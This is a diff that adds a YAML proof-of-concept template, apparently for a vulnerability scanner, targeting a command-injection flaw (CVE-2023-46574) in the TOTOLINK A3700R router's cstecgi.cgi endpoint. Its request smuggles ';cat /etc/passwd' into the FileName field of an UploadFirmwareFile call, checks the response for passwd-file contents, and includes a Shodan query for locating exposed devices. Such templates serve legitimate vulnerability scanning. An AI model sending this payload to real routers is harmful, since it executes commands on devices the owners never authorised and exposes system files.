@@ -1,0 +1,16 @@
+id: poc-yaml-totolink-a3700r-cstecgi-cgi-command-injection
+info:
+  name: TOTOLINK A3700R cstecgi.cgi 命令注入漏洞(CVE-2023-46574)
+  severity: critical
+  tags:
+  - CVE-2023-46574
+  - 命令注入
+  finger: TOTOLINK A3700R
+  shodan: title:"Totolink"
+requests:
+- method: GET
+  path: /cgi-bin/cstecgi.cgi
+  data: '{"topicurl":"UploadFirmwareFile","FileName":";cat /etc/passwd"}'
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+variables: {}
+transport: http
